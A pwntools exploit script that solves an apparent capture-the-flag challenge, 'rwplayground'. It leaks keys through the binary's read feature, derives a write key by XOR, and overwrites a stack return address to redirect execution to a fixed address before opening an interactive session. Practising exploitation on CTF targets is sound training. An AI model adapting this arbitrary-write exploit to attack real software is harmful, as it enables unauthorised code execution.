from pwn import *

elf = context.binary = ELF('./rwplayground')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("rwplayground.challs.olicyber.it", 38051)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    c
    ''')
else:
    conn = elf.process()

conn.recvuntil(b'...')
stack = int(conn.recvline().strip(), 16)
print(hex(stack))

conn.recvuntil(b'>')
conn.sendline(b'1') 
conn.recvline()
conn.sendline(b'0x40406C')
conn.recvuntil(b'value:')
readkey = int(conn.recvline().strip(), 16)
print(readkey)

conn.recvuntil(b'>')
conn.sendline(b'1') 
conn.recvline()
conn.sendline(b'0x4040B8')
conn.recvuntil(b'value:')
writekeyxor = int(conn.recvline().strip(), 16)
print(writekeyxor)

writekey = hex(writekeyxor ^ readkey)

print(writekey)


conn.recvuntil(b'>')
conn.sendline(b'2') 
conn.recvline()
conn.sendline(b'0x4040B8')
conn.recvline()
conn.sendline(writekey)

conn.recvuntil(b'>')
conn.sendline(b'2') 
conn.recvline()
conn.sendline(hex(stack+20))
print(hex(stack+20))
conn.recvline()
conn.sendline(b'0x401397')

conn.recvuntil(b'>')
conn.sendline(b'4') 




conn.interactive()
